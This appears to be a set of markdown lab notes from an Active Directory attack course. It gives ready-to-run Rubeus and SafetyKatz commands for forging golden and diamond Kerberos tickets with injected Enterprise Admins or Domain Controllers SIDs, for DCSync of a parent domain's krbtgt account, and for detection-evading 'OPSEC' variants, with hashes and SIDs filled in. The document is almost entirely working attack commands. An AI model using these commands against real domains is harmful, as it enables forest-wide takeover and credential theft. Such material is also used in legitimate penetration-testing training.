Essentialy just forging a `Golden Ticket` but adding the putting the Enterprise Admins group as the`sIDHistory` at the same time

#### Rubeus

**OPSEC** - Create a Diamond Ticket using the `Domain Controllers` group instead of the Enterprise Admins group along with the domain controller machine account and the Enterprise Domain Controllers forest group 
```powershell
.\Loader.exe -path .\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Golden Ticket using the Domain Controllers machine account for more **OPSEC**
```powershell
.\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt
```

DCSync on parent domain `krbtgt` account
```powershell
.\Loader.exe -path .\SafetyKatz.exe "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Using the Administrator account
```powershell
.\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt
```

#### Safetykatz
Due to the trust, the parent domain will trust the TGT.
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

**OPSEC OPTION** - Use the Domain Controllers Machine group,the Domain controller machine account and the Enterprise Domain Controllers forest group
	- `S-1-5-21-2578538781-2508153159-3419410681-516` - Domain Controllers
	- `S-1-5-9` - Enterprise Domain Controllers
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819- 3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

Run a DCsync
```powershell
.\Loader.exe -path .\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

![[Pasted image 20250519110323.png]]